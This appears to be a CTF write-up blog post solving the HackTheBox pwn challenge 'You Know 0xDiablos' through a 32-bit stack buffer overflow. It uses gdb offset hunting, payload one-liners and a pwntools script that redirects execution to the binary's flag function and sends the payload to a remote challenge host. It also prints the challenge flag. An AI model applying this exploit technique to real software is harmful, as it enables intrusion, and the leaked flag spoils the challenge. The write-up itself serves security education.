---
title: You Know 0xDiablos
date: 2022-06-11 14:55:40
img: 
categories: 
  - pwn
  - ctf
  - challenges
  - hackthebox
author: 0xma
tags:
  - pwn
  - BoF
---
# You Know 0xDiablos

## Reconnaissance

![Untitled](/medias/images/diablos/Untitled.png)

NX 

```bash
┌──(kali㉿kali)-[~/…/HackTheBox/Challenges/Pwn/You Know 0xDiablos]
└─$ readelf -s vuln

Symbol table '.dynsym' contains 14 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.0 (2)
     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.0 (2)
     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND fgets@GLIBC_2.0 (2)
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND getegid@GLIBC_2.0 (2)
     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.0 (2)
     6: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.0 (2)
     8: 00000000     0 FUNC    GLOBAL DEFAULT  UND __[...]@GLIBC_2.0 (2)
     9: 00000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@GLIBC_2.0 (2)
    10: 00000000     0 FUNC    GLOBAL DEFAULT  UND fopen@GLIBC_2.1 (3)
    11: 00000000     0 OBJECT  GLOBAL DEFAULT  UND stdout@GLIBC_2.0 (2)
    12: 00000000     0 FUNC    GLOBAL DEFAULT  UND se[...]@GLIBC_2.0 (2)
    13: 0804a004     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used

Symbol table '.symtab' contains 75 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 08048194     0 SECTION LOCAL  DEFAULT    1 .interp
     2: 080481a8     0 SECTION LOCAL  DEFAULT    2 .note.gnu.build-id
     3: 080481cc     0 SECTION LOCAL  DEFAULT    3 .note.ABI-tag
     4: 080481ec     0 SECTION LOCAL  DEFAULT    4 .gnu.hash
     5: 0804820c     0 SECTION LOCAL  DEFAULT    5 .dynsym
     6: 080482ec     0 SECTION LOCAL  DEFAULT    6 .dynstr
     7: 0804837a     0 SECTION LOCAL  DEFAULT    7 .gnu.version
     8: 08048398     0 SECTION LOCAL  DEFAULT    8 .gnu.version_r
     9: 080483c8     0 SECTION LOCAL  DEFAULT    9 .rel.dyn
    10: 080483d8     0 SECTION LOCAL  DEFAULT   10 .rel.plt
    11: 08049000     0 SECTION LOCAL  DEFAULT   11 .init
    12: 08049020     0 SECTION LOCAL  DEFAULT   12 .plt
    13: 080490d0     0 SECTION LOCAL  DEFAULT   13 .text
    14: 08049398     0 SECTION LOCAL  DEFAULT   14 .fini
    15: 0804a000     0 SECTION LOCAL  DEFAULT   15 .rodata
    16: 0804a058     0 SECTION LOCAL  DEFAULT   16 .eh_frame_hdr
    17: 0804a0ac     0 SECTION LOCAL  DEFAULT   17 .eh_frame
    18: 0804bf08     0 SECTION LOCAL  DEFAULT   18 .init_array
    19: 0804bf0c     0 SECTION LOCAL  DEFAULT   19 .fini_array
    20: 0804bf10     0 SECTION LOCAL  DEFAULT   20 .dynamic
    21: 0804bff8     0 SECTION LOCAL  DEFAULT   21 .got
    22: 0804c000     0 SECTION LOCAL  DEFAULT   22 .got.plt
    23: 0804c034     0 SECTION LOCAL  DEFAULT   23 .data
    24: 0804c03c     0 SECTION LOCAL  DEFAULT   24 .bss
    25: 00000000     0 SECTION LOCAL  DEFAULT   25 .comment
    26: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    27: 08049130     0 FUNC    LOCAL  DEFAULT   13 deregister_tm_clones
    28: 08049170     0 FUNC    LOCAL  DEFAULT   13 register_tm_clones
    29: 080491b0     0 FUNC    LOCAL  DEFAULT   13 __do_global_dtors_aux
    30: 0804c03c     1 OBJECT  LOCAL  DEFAULT   24 completed.6887
    31: 0804bf0c     0 OBJECT  LOCAL  DEFAULT   19 __do_global_dtor[...]
    32: 080491e0     0 FUNC    LOCAL  DEFAULT   13 frame_dummy
    33: 0804bf08     0 OBJECT  LOCAL  DEFAULT   18 __frame_dummy_in[...]
    34: 00000000     0 FILE    LOCAL  DEFAULT  ABS vuln.c
    35: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    36: 0804a218     0 OBJECT  LOCAL  DEFAULT   17 __FRAME_END__
    37: 00000000     0 FILE    LOCAL  DEFAULT  ABS 
    38: 0804bf0c     0 NOTYPE  LOCAL  DEFAULT   18 __init_array_end
    39: 0804bf10     0 OBJECT  LOCAL  DEFAULT   20 _DYNAMIC
    40: 0804bf08     0 NOTYPE  LOCAL  DEFAULT   18 __init_array_start
    41: 0804a058     0 NOTYPE  LOCAL  DEFAULT   16 __GNU_EH_FRAME_HDR
    42: 0804c000     0 OBJECT  LOCAL  DEFAULT   22 _GLOBAL_OFFSET_TABLE_
    43: 08049390     1 FUNC    GLOBAL DEFAULT   13 __libc_csu_fini
    44: 08049120     4 FUNC    GLOBAL HIDDEN    13 __x86.get_pc_thunk.bx
    45: 0804c034     0 NOTYPE  WEAK   DEFAULT   23 data_start
    46: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.0
    47: 00000000     0 FUNC    GLOBAL DEFAULT  UND gets@@GLIBC_2.0
    48: 08049391     0 FUNC    GLOBAL HIDDEN    13 __x86.get_pc_thunk.bp
    49: 08049272    63 FUNC    GLOBAL DEFAULT   13 vuln
    50: 00000000     0 FUNC    GLOBAL DEFAULT  UND fgets@@GLIBC_2.0
    51: 0804c03c     0 NOTYPE  GLOBAL DEFAULT   23 _edata
    52: 08049398     0 FUNC    GLOBAL HIDDEN    14 _fini
    53: 00000000     0 FUNC    GLOBAL DEFAULT  UND getegid@@GLIBC_2.0
    54: 0804c034     0 NOTYPE  GLOBAL DEFAULT   23 __data_start
    55: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.0
    56: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    57: 00000000     0 FUNC    GLOBAL DEFAULT  UND exit@@GLIBC_2.0
    58: 0804c038     0 OBJECT  GLOBAL HIDDEN    23 __dso_handle
    59: 0804a004     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used
    60: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]
    61: 08049330    93 FUNC    GLOBAL DEFAULT   13 __libc_csu_init
    62: 00000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@@GLIBC_2.0
    63: 00000000     0 FUNC    GLOBAL DEFAULT  UND fopen@@GLIBC_2.1
    64: 0804c040     0 NOTYPE  GLOBAL DEFAULT   24 _end
    65: 08049110     1 FUNC    GLOBAL HIDDEN    13 _dl_relocate_sta[...]
    66: 080490d0    55 FUNC    GLOBAL DEFAULT   13 _start
    67: 0804a000     4 OBJECT  GLOBAL DEFAULT   15 _fp_hw
    68: 00000000     0 OBJECT  GLOBAL DEFAULT  UND stdout@@GLIBC_2.0
    69: 0804c03c     0 NOTYPE  GLOBAL DEFAULT   24 __bss_start
    70: 080492b1   118 FUNC    GLOBAL DEFAULT   13 main
    71: 0804c03c     0 OBJECT  GLOBAL HIDDEN    23 __TMC_END__
    72: 00000000     0 FUNC    GLOBAL DEFAULT  UND setresgid@@GLIBC_2.0
    73: 080491e2   144 FUNC    GLOBAL DEFAULT   13 flag
    74: 08049000     0 FUNC    GLOBAL HIDDEN    11 _init
```

![Untitled](/medias/images/diablos/Untitled%201.png)

We got flag function

we should to get flag function after our buffer ..

## Offset

Create pattern with metasploit

```bash
msf-pattern_create -l 1000 > fuzz.in
```

run with gdb

```bash
┌──(kali㉿kali)-[~/…/HackTheBox/Challenges/Pwn/You Know 0xDiablos]
└─$ gdb -q vuln
Reading symbols from vuln...
(No debugging symbols found in vuln)
gdb-peda$ r < fuzz.in 
Starting program: /home/kali/Documents/CTF/HackTheBox/Challenges/Pwn/You Know 0xDiablos/vuln < fuzz.in
You know who are 0xDiablos: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x3e9 
EBX: 0x41306741 ('Ag0A')
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7fad000 --> 0x1e9d6c 
EDI: 0xf7fad000 --> 0x1e9d6c 
EBP: 0x67413167 ('g1Ag')
ESP: 0xffffcf00 ("Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An"...)
EIP: 0x33674132 ('2Ag3')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x33674132
[------------------------------------stack-------------------------------------]
0000| 0xffffcf00 ("Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An"...)
0004| 0xffffcf04 ("g5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1"...)
0008| 0xffffcf08 ("6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"...)
0012| 0xffffcf0c ("Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An"...)
0016| 0xffffcf10 ("g9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5"...)
0020| 0xffffcf14 ("0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6A"...)
0024| 0xffffcf18 ("Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An"...)
0028| 0xffffcf1c ("h3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x33674132 in ?? ()
gdb-peda$
```

Run with this command for getting offset

![Untitled](/medias/images/diablos/Untitled%202.png)

```bash
msf-pattern_offset -l 1000 -q 0x33674132
```

![Untitled](/medias/images/diablos/Untitled%203.png)

- **-l :** Length our pattern
- **-q** : Address out EIP

Offset : 188

if we take a look on gdb, we see EBP

![Untitled](/medias/images/diablos/Untitled%204.png)

Offset - EBP

Offset = 188

EBP in 32 bit is 4 byte

so 188 - 4 = 184

```bash
┌──(kali㉿kali)-[~/…/HackTheBox/Challenges/Pwn/You Know 0xDiablos]
└─$ echo `python2 -c "print 'A'*184 + 'B'*4"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

```bash
┌──(kali㉿kali)-[~/…/HackTheBox/Challenges/Pwn/You Know 0xDiablos]
└─$ gdb -q vuln 
Reading symbols from vuln...
(No debugging symbols found in vuln)
gdb-peda$ r 
Starting program: /home/kali/Documents/CTF/HackTheBox/Challenges/Pwn/You Know 0xDiablos/vuln 
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xbd 
EBX: 0x41414141 ('AAAA')
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7fad000 --> 0x1e9d6c 
EDI: 0xf7fad000 --> 0x1e9d6c 
EBP: 0x42424242 ('BBBB')
ESP: 0xffffcf80 --> 0x1 
EIP: 0x8049300 (<main+79>:      adc    BYTE PTR [ebx-0x7c72f314],al)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0x8049300 <main+79>: adc    BYTE PTR [ebx-0x7c72f314],al
   0x8049306 <main+85>: cmp    al,ah
   0x8049308 <main+87>: (bad)  
   0x8049309 <main+88>: call   DWORD PTR [eax-0x18]
[------------------------------------stack-------------------------------------]
0000| 0xffffcf80 --> 0x1 
0004| 0xffffcf84 --> 0xffffd054 --> 0xffffd210 ("/home/kali/Documents/CTF/HackTheBox/Challenges/Pwn/You Know 0xDiablos/vuln")
0008| 0xffffcf88 --> 0xffffd05c --> 0xffffd25b ("COLORFGBG=15;0")
0012| 0xffffcf8c --> 0x3e8 
0016| 0xffffcf90 --> 0xffffcfb0 --> 0x1 
0020| 0xffffcf94 --> 0x0 
0024| 0xffffcf98 --> 0x0 
0028| 0xffffcf9c --> 0xf7de1fd6 (<__libc_start_main+262>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x08049300 in main ()
gdb-peda$
```

![Untitled](/medias/images/diablos/Untitled%205.png)

Next step is call flag function, we can get to know with this command like before

```bash
readelf -s vuln
```

convert flag address to little endian, you can use struck or pwntools

```bash
┌──(kali㉿kali)-[~/…/HackTheBox/Challenges/Pwn/You Know 0xDiablos]
└─$ python2
Python 2.7.18 (default, Sep 24 2021, 09:39:51) 
[GCC 10.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import pwn, struct
>>> 
>>> # Using pwntools
... 
>>> struct.pack('<I', 0x080491e2)
'\xe2\x91\x04\x08'
>>> pwn.p32(0x080491e2)
'\xe2\x91\x04\x08'
```

in struct we use '<I' because

- < : Little Endian
- I : integer

lets copy our lttle endian to payload

![Untitled](/medias/images/diablos/Untitled%206.png)

```bash
echo `python2 -c "print 'A'*184 + 'B'*4 + '\xe2\x91\x04\x08'"` | ./vuln
```

We can see if our payload succes to call flag function, in next step is we should to overwrite return address and put 2 arguments like in ghidra

![Untitled](/medias/images/diablos/Untitled%207.png)

return address in 32 bit is 4byte so we can add C 4 times in our payload, and convert thats argument to little endian

```bash
┌──(kali㉿kali)-[~/…/HackTheBox/Challenges/Pwn/You Know 0xDiablos]
└─$ python2                                                                
Python 2.7.18 (default, Sep 24 2021, 09:39:51) 
[GCC 10.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import pwn
>>> 
>>> pwn.p32(0xdeadbeef)
'\xef\xbe\xad\xde'
>>> pwn.p32(0xc0ded00d)
'\r\xd0\xde\xc0'
```

finnal payload

```bash
echo `python2 -c "print 'A'*184 + 'B'*4 + '\xe2\x91\x04\x08' + 'C'*4 + '\xef\xbe\xad\xde' + '\r\xd0\xde\xc0'"` | nc IP PORT
```

![Untitled](/medias/images/diablos/Untitled%208.png)

Flag : HTB{0ur_Buff3r_1s_not_healthy}

## Scripting with pwntools

```python
from pwn import *
import struct

#p = process('./vuln')
p = remote('178.128.162.158', 30038)

padding = "A" * 184
ebp = "B" * 4
ret = "C" * 4

eip  = p32(0x080491e2)
arg1 = p32(0xdeadbeef)
arg2 = p32(0xc0ded00d)

payload  = padding + ebp + eip + ret + arg1 + arg2

print payload

p.sendline(payload)
p.interactive()
```